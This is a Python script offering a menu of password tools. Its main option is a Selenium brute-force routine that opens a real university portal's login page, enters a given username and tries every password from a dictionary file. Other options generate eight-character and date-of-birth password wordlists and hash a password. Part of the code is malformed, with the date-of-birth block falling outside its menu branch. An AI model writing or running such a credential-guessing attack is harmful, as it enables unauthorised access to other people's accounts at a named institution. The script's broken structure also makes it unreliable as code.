import time
import itertools
import selenium
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from pynput.keyboard import Key, Controller
def print_cool_pattern():
    n = 25
    for i in range(n):
        row = ""
        for j in range(n):
            if i == j or i + j == n - 1:
                row += "* "
            elif i < j and i + j < n - 1:
                row += "  "
            elif i > j and i + j > n - 1:
                row += "  "
            else:
                row += "* "
        print(row)

print_cool_pattern()
print("")        
print("")
print("      WELCOME    ")
print("         TO      ")
print("        ARNE     ")
print("1  -->  BRUTE FORCE  [$_$]")
print("2  -->  Passwords{^_-}")
print("3  -->  Password According to User{^_-}")
print("4  -->  Hash code converter{^_-}")
print("Other tool  are coming soon (^-^) ")
choice =int(input("enter your choice : "))

match choice:
    case 1:
        
        txtUsername = input('Username: ')
        dictionary = input('Choose Dictionary: ')

        file = open(f'{dictionary}.txt', 'r')
        bruteforce = []
        for line in file:
            line = line.strip()
            bruteforce.append(line)
        file.close()
        #print(bruteforce)
        keyboard = Controller()
        web = webdriver.Chrome() 
        web.get("https://ums.paruluniversity.ac.in/Login.aspx")
        time.sleep(2)
        keyboard.type(txtUsername)
        time.sleep(0.5)
        keyboard.press(Key.tab)
        time.sleep(0.5)
        #value = web.find_element(By.id("txtPassword"))
        value = web.find_element(By.NAME, "txtPassword")
        #value = web.find_element_by_name('<span id="txtPassword">Enter Password</span>')
        #span id="rvtxtPassword">Enter Password</span>
        for brute in bruteforce:
            print(brute)
            value.send_keys(brute)
            time.sleep(5)
    
    # Wait for a short period before typing the next name
    
    #time.sleep(2)
            value.send_keys(Keys.RETURN)
    
            time.sleep(10)
    #keyboard.type(brute)
    #keyboard.type(brute, into="txtPassword")
    #keyboard.press(Key.enter)
    #keyboard.release(Key.enter)
    case 3:
        items = input("Enter a string of items: ")
        combos = []

        for combo in itertools.combinations_with_replacement(items, 8):
            combos.append(''.join(combo))
            with open('combinations.txt', 'w') as file:
                for combo in combos:
                    file.write(combo + '\n')

                    print("Combinations with replacement of length 8 saved to 'combinations.")
    case 4:
        import hashlib

        password = input("Enter your password: ")
        hash_object = hashlib.sha256(password.encode('utf-8'))
        hex_dig = hash_object.hexdigest()
        fl=open("hash.txt",'w')
        fl.writelines(hex_dig)
        print("Hash code for the password is:", hex_dig)

    
        
            
    
    case 2:
        print ("1. DOB PASSWORD simplifer")
        print ("2. certain passwords ")
        choice2 =int(input("enter your choice :"))
        match choice2:
            case 1:
                import itertools

day_values = ["{:02d}".format(i) for i in range(1, 32)]
month_values = ["{:02d}".format(i) for i in range(1, 13)]
year_values = ["{:04d}".format(i) for i in range(1999, 2018)]

combinations = itertools.product(day_values, month_values, year_values, repeat=1)


with open("output.txt", "w") as file:
    for combo in combinations:
        if int(combo[0]) <= 31 and int(combo[1]) <= 12 and int(combo[2]) >= 1999 and int(combo[2]) <= 2017:
            output = "".join(combo)
            if len(output) == 8:
            
                file.write(output + "\n")